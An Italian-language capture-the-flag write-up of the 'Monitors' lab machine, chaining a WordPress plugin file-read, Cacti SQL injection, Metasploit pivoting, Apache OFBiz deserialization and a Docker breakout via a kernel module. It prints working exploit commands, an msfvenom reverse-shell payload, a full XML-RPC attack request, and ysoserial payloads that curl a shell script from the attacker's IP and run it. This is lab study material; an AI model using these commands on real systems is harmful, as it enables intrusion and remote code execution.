+++
date = '2026-08-20T12:22:41+02:00'
draft = false
title = 'Monitors Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`18/08/2026`**

![pwn.png](/images/imgs_monitors/pwn.png)

---
# Introduzione

**_Monitors_** è una macchina **Linux** di difficoltà **Hard** che richiede solide capacità di enumerazione, troubleshooting e una buona comprensione degli ambienti **Java** e delle capabilities di **Docker**.

L'initial foothold richiede di concatenare una **Remote File Inclusion** in un plugin di **WordPress** per estrarre delle credenziali e scoprire un virtual host **Apache** nascosto che hosta **Cacti**. Dopo aver sfruttato una **SQL Injection** autenticata in **Cacti** per ottenere **remote code execution**, inizia l'enumerazione interna.

Il lateral movement forza il pivot tramite Metasploit, dato che le librerie **GLIBC** del box sono obsolete e rompono i moderni tool di tunneling. Una volta creato il tunnel, ci troviamo di fronte a un'istanza **Apache OFBiz** vulnerabile alla **CVE-2020-9496**, un'unauthenticated **XML-RPC deserialization**, che richiede un ambiente **Java** altamente specifico per compilare con successo i payload di **ysoserial**. Infine, dopo aver ottenuto una shell all'interno di un container, una pericolosa capability **`cap_sys_module`** ci permette di iniettare un modulo kernel malevolo e fare il breakout sull'host per leggere entrambe le flag.

---
# Tecniche Utilizzate

- **RFI (Information Disclosure)**

- **Apache Virtual Host Enumeration**

- **Cacti Authenticated SQL Injection (CVE-2020-14295)**

- **Internal Port Forwarding via Metasploit**

- **Apache OFBiz XML-RPC Deserialization (CVE-2020-9496)**

- **Docker Container Breakout via cap_sys_module**

---
# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- monitors
```

```text
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
9773/tcp  filtered unknown
17702/tcp filtered unknown
20061/tcp filtered unknown
45353/tcp filtered unknown
62765/tcp filtered unknown
65265/tcp filtered unknown
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV monitors
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Porte Aperte**:

- **22**/tcp - SSH

- **80**/tcp - HTTP

## Enumerazione Web 

Nella web page sulla porta 80, era presente il messaggio:

![web1.png](/images/imgs_monitors/web1.png)

Ho aggiunto quindi **`monitors.htb`** al mio file **`/etc/hosts`** e ho navigato sul dominio, rivelando un sito **WordPress**.

![web2.png](/images/imgs_monitors/web2.png)

Ho lanciato **wpscan** per controllare eventuali vulnerabilità, ma non ha trovato nulla di utile.

```bash
wp-scan --url http://monitors.htb
```

Ho lanciato una scan delle directory con Gobuster.

![gob1.png](/images/imgs_monitors/gob1.png)

Nel frattempo, ho visitato manualmente **`/wp-admin`** dove era hostato il form di login.

![wp-login.png](/images/imgs_monitors/wp-login.png)

Ho visitato anche **`/wp-content`**, e dato che l'indicizzazione delle directory non era abilitata, ho lanciato un'altra scansione con **Gobuster** targettando quella directory.

```bash
gobuster dir -u http://monitors.htb/wp-content/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

![gob2.png](/images/imgs_monitors/gob2.png)

Questa seconda scansione ha trovato una directory **`/plugins`**. Navigando al suo interno, ho scoperto il:
-  **plugin `wp-with-spritz`**.

![plugins.png](/images/imgs_monitors/plugins.png)

---
# Accesso Iniziale | RFI to Cacti SQLi

Ho cercato su **Google** eventuali **CVE** relative a questo plugin e ho trovato una entry su **Exploit-DB** (**44544**) che descriveva una **RFI**:

- https://www.exploit-db.com/exploits/44544

![exdb.png](/images/imgs_monitors/exdb.png)

![exdb2.png](/images/imgs_monitors/exdb2.png)

L'ho testata usando il payload fornito per leggere **`/etc/passwd`** manipolando il parametro url:

```text
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
```

![passwd.png](/images/imgs_monitors/passwd.png)

Ho ottenuto il contenuto del file **`/etc/passwd`**. Filtrando per gli utenti **`/bin/bash`**, ho trovato l'utente **marcus**.

Dato che una delle prime cose che cerco quando ho a che fare con un server **WordPress** è il file **`wp-config.php`**, ho sfruttato l'**RFI** per leggerlo.

![wp-config.png](/images/imgs_monitors/wp-config.png)

Ho estratto la password del database: **`BestAdministrator@2020!`**, che ho subito provato sul servizio **SSH** e sulla pagina di login di **`wp-admin`**, permission denied.

![ssh_fail.png](/images/imgs_monitors/ssh_fail.png)

![web_fail.png](/images/imgs_monitors/web_fail.png)

Ho cercato una cheatsheet di file interessanti di **Apache2** da poter leggere.

**Nota**: _Nei sistemi basati su **Ubuntu/Debian**, **Apache** separa le configurazioni dei **virtual host** in due directory: **`/etc/apache2/sites-available/`** (dove sono salvate tutte le configurazioni) e **`/etc/apache2/sites-enabled/`** (dove vengono posizionati i symlink dei siti attualmente attivi). Durante lo sfruttamento di un'**RFI**, leggere file come **`/etc/apache2/sites-enabled/000-default.conf`** è una classica tecnica di enumerazione per scoprire **sottodomini** nascosti o **virtual host** interni che sono attivi sul server ma non esposti sul **DNS** pubblico._

Ho recuperato questo file usando l'**RFI**:

```text
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../..///etc/apache2/sites-enabled/000-default.conf
```

![virtual.png](/images/imgs_monitors/virtual.png)

Il file faceva riferimento a due file di configurazione attivi:

- **`monitors.htb.conf`**

- **`cacti-admin.monitors.htb.conf`**

Ho subito pensato a un possibile nuovo **virtual host**: **`cacti-admin.monitors.htb`**. Ho provato a recuperare i file **`.conf`**, ma non ci sono riuscito. Così, ho aggiunto il nuovo sottodominio al mio **`/etc/hosts`** e l'ho visitato.

Era hostata un'istanza di **Cacti** con un login, la cui versione era esposta in basso: **`1.2.12`**.

**Nota**: _**Cacti** è una soluzione open-source per il network monitoring e la creazione di grafici. Agisce come frontend per **RRDTool**, permettendo agli amministratori di interrogare i dispositivi di rete a intervalli predeterminati e di inserire i dati risultanti dentro grafici._

![cacti.png](/images/imgs_monitors/cacti.png)

Inizialmente ho provato a loggarmi usando **`marcus:BestAdministrator@2020!`**, ma nulla. Poi ho provato **`admin:BestAdministrator@2020!`** e mi sono loggato con successo.

![cacti_logged.png](/images/imgs_monitors/cacti_logged.png)

Ho cercato eventuali **CVE** note che affliggono questa specifica versione:

```bash
searchsploit cacti 1.2.12
```

![scsploit1.png](/images/imgs_monitors/scsploit1.png)

- **`Cacti 1.2.12 - 'filter' SQL Injection | php/webapps/49810.py`**.

**Nota**: _La **CVE-2020-14295** è una **SQL injection** autenticata localizzata nel parametro **filter** del file **`color.php`**. Poiché **Cacti** supporta le stacked queries, un attaccante può manipolare il database per cambiare l'impostazione **`path_php_binary`** facendola puntare ad un comando malevolo. Quando viene richiamato un update, l'applicazione esegue questo payload, elevando la **SQL injection** direttamente a **Remote Code Execution** (**RCE**)._

Ho lanciato l'exploit e ho ottenuto l'Accesso Iniziale come **`www-data`**.

```bash
python3 49810.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.15.152 --lport 22667
```

![initial_access.png](/images/imgs_monitors/initial_access.png)

---
# Lateral Movement | Internal Enum & Tunneling

Ho subito puntato ai database interni.

```bash
mysql -u admin -p
```

Ho recuperato l'hash dell'admin di **WordPress**:

```SQL
show databases;
use wordpress;
show tables;
select * from wp_users;
```

![db1.png](/images/imgs_monitors/db1.png)

Ma non sono riuscito a craccarlo, così ho deciso di enumerare localmente l'istanza di **Cacti**. Ho cercato su **Google** dove **Cacti** memorizza il file di configurazione del **DB** (**`include/config.php`**).

```bash
locate cacti
cd /usr/share/cacti/cacti
cat include/config.php
```

![db2.png](/images/imgs_monitors/db2.png)

Mi sono connesso al **DB** come utente **cacti** e ho recuperato un altro hash per l'admin dalla tabella **`user_auth`**, ma non sono riuscito a craccare neanche questo.

![db3.png](/images/imgs_monitors/db3.png)

Qui mi sono bloccato. Ho provato a fare una rapida enumerazione interna manuale generica, ma alla fine ho preferito automatizzare il processo usando **`linpeas.sh`**.
**Linpeas** ha segnalato alcuni vettori potenzialmente interessanti.

Tra questi, era presente la vulnerabilità **Copy-Fail**, che ho completamente ignorato perché l'avevo già testata su una macchina precedente e non avevo voglia di compromettere il sistema usando un **low-hanging fruit** del genere.

Un'altra cosa interessante era un servizio in ascolto sulla porta locale **8443**.

![8443.png](/images/imgs_monitors/8443.png)

Inizialmente ho provato a trasferire **chisel** per creare un tunnel. Tuttavia, dato che questo box ha 3-4 anni e possiede una versione obsoleta di **libc6**, se si prova a lanciare **chisel**, questa restituisce un errore fatale causato dalla mancanza di **`GLIBC_2.32`**.

Ero seriamente bloccato. Ho letto attentamente tutto l'output di **Linpeas** ancora una volta... nulla di importante a parte quel servizio sulla porta **8443**. L'unica cosa che mi è venuta in mente è stata creare un tunnel usando **Metasploit**.

Ho creato un payload per una sessione **meterpreter**:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f elf > fall.elf
```

L'ho trasferito usando **nc**, ho settato un **listener** e ho eseguito lo script. Una volta ottenuta la sessione **meterpreter**, ho forwardato la porta locale:

```bash
portfwd add -L 0.0.0.0 -l 8443 -p 8443 -r 127.0.0.1
```

![msf.png](/images/imgs_monitors/msf.png)

## Exploiting Apache OFBiz (CVE-2020-9496)

Dato che la pagina web su [https://localhost:8443](https://localhost:8443) mostrava un errore **404** di **Apache Tomcat**:

![web_8443.png](/images/imgs_monitors/web_8443.png)

Ho lanciato uno scan con **Gobuster** per enumerare le directory.

```bash
gobuster dir -u https://localhost:8843/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -k
```

![gob3.png](/images/imgs_monitors/gob3.png)

Ha trovato parecchi risultati: **`/images`**, **`/content`**, **`/common`**, **`/catalog`**, **`/marketing`**, **`/ecommerce`**, ecc.
Ho analizzato i più interessanti, e **`/catalog`** mi ha reindirizzato ad una pagina di login di un'istanza **Apache OFBiz**.

![ofbiz_login.png](/images/imgs_monitors/ofbiz_login.png)

Versione: **`Release 17.12.01`**.

Ho cercato **CVE**s:

```bash
searchsploit Apache OFBiz 17.12.01
```

![scsploit2.png](/images/imgs_monitors/scsploit2.png)

**Nota**: _La **CVE-2020-9496** è un'unauthenticated **XML-RPC deserialization**. L'endpoint **XML-RPC** di **OFBiz** (**`/webtools/control/xmlrpc`**) gestisce in modo improprio i dati **XML** in entrata, consentendo specificamente l'istanza di oggetti **Java** arbitrari tramite il tag "**serializable**". Costruendo un payload serializzato malevolo (usando un tool come **ysoserial**) e incorporandolo all'interno della richiesta **XML**, un attaccante può ottenere **Remote Code Execution** (**RCE**) ancor prima che vengano eseguiti controlli di autenticazione._

Da questo momento in poi, è iniziata una fase di troubleshooting incredibilmente frustrante per riuscire a ottenere questa code execution.

Lo script originale falliva perché cercava di scaricare una versione di **ysoserial** che non è più disponibile. Ho cercato un altro **PoC** ([CVE-2020-9496 on GitHub](https://github.com/ambalabanov/CVE-2020-9496)) ma ho riscontrato lo stesso problema.

Per risolvere questa discrepanza, ho scaricato manualmente l'ultima versione di **`ysoserial-all.jar`** dal [repository ufficiale](https://github.com/frohoff/ysoserial/releases).

Poi, ho iniziato a ricevere errori riguardanti la mia versione di **Java**:

![script_fail.png](/images/imgs_monitors/script_fail.png)

**Nota**: _Le versioni moderne di **Java** (**11+**) hanno un'incapsulazione dei moduli più rigida, che rompe completamente le tecniche di reflection usate da **ysoserial** per generare i payload. Ho dovuto effettuare esplicitamente un downgrade del mio ambiente a **Java 8**._

```bash
sudo apt install temurin-8-jdk
export JAVA8="/usr/lib/jvm/temurin-8-jdk-amd64/bin/java"
```

Con il giusto ambiente **Java**, sono finalmente riuscito a usare **ysoserial**. Dato che non riuscivo a ottenere una reverse shell direttamente tramite il payload di **deserialization**, ho creato uno script **`shell.sh`** malevolo sulla mia macchina **Kali**:

![shell.png](/images/imgs_monitors/shell.png)

Ho creato il primo payload volto a scaricare il mio script:

```bash
java -jar ysoserial.jar CommonsBeanutils1 'curl http://10.10.15.152:8000/shell.sh -o /tmp/shell.sh' | base64 | tr -d "\n"
```

![payload1.png](/images/imgs_monitors/payload1.png)

Ho servito la shell su un server **Python** e ho inviato questa richiesta **POST** tramite **Burpsuite** all'endpoint **XML-RPC**:

```XML
POST /webtools/control/xmlrpc HTTP/1.1
Host: localhost:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0)
Connection: close
Content-Type: test/xml
Content-Length: 4137

<?xml version="1.0"?>
<methodCall>
  <methodName>fallingstar</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>fallingstar</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">[payload]</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
```

Ho poi creato un secondo payload per eseguirla:

```bash
java -jar ysoserial.jar CommonsBeanutils1 'bash /tmp/shell.sh' | base64 | tr -d "\n"
```

![payload2.png](/images/imgs_monitors/payload2.png)

Ho impostato un listener **netcat**, ho iniettato il nuovo payload esattamente nello stesso body **XML** su **Burp**, ho inviato la richiesta e finalmente — _dopo 2 ore di adattamenti e troubleshooting_ — ho ricevuto una shell come **root**.

![container.png](/images/imgs_monitors/container.png)

---
# Privilege Escalation | Container Breakout

Ho iniziato l'enumerazione come sempre controllando **`/dev`** e cercando block devices come **`/sda`**, ma non c'era nulla.
Ho caricato nuovamente **linpeas** e l'ho eseguito. Niente di immediatamente utile a prima vista.

Ho cercato su **Google** liste di possibili tecniche per fare **container breakout** e ho letto documentazione sulle capabilities di **Docker**:
- https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation. 

Ricontrollando l'output di **Linpeas**, ho notato che in effetti ne aveva flaggate:

![cap_sys_module.png](/images/imgs_monitors/cap_sys_module.png)

Cercando su **Google** "**Container breakout capability name**" una per una, ho trovato una tecnica che coinvolge la **`cap_sys_module`**. Questa permette ad un container privilegiato di caricare moduli kernel direttamente nel kernel dell'host.

- [https://greencashew.dev/posts/how-to-add-reverseshell-to-host-from-the-privileged-container/](https://greencashew.dev/posts/how-to-add-reverseshell-to-host-from-the-privileged-container/)

Ho seguito i passaggi sul container:

```bash
vi rev-shell.c
vi Makefile
make
```

Sulla mia macchina attaccante, ho avviato un ultimo listener:

```bash
nc -lvnp 22667
```

Tornato sul container, ho iniettato il modulo kernel compilato all'interno dell'host:

```bash
insmod rev-shell.ko
```

Ho effettuato con successo il breakout dal container e ho recuperato sia la **user flag** che la **root flag** direttamente dall'host.

![flags.png](/images/imgs_monitors/flags.png)

---
# Considerazioni Finali

Questa macchina mi è piaciuta parecchio. Sicuramente una difficoltà **Hard** per l'enorme quantità di step che richiede da zero fino alla compromissione totale del sistema.

Tuttavia, penso che la difficoltà tecnica dei singoli passaggi sia più vicina a un livello **Medium**. L'unica eccezione è stata la parte di **Java deserialization**, che si è rivelata incredibilmente frustrante a causa delle versioni più recenti di **Java** e **ysoserial** che rompevano i vecchi **PoC** (_cosa prevedibile, dato che ho fatto questa macchina nel 2026_). Gestire gli errori **GLIBC** e forzare un pivot con **M**etasploit ha solo aggiunto ulteriore realismo. Nel complesso, un ottimo esercizio di troubleshooting.

**Fonti**:

- **WordPress `wp-with-spritz` RFI/LFI | [https://www.exploit-db.com/exploits/44544](https://www.exploit-db.com/exploits/44544)**

- **Apache OFBiz (CVE-2020-9496) PoC | [https://github.com/ambalabanov/CVE-2020-9496](https://github.com/ambalabanov/CVE-2020-9496)**

- **ysoserial Repository | [https://github.com/frohoff/ysoserial/releases](https://github.com/frohoff/ysoserial/releases)**

- **HackTricks - Docker Breakout | [https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation](https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)**

- **Container Breakout via `cap_sys_module` | [https://greencashew.dev/posts/how-to-add-reverseshell-to-host-from-the-privileged-container/](https://greencashew.dev/posts/how-to-add-reverseshell-to-host-from-the-privileged-container/)**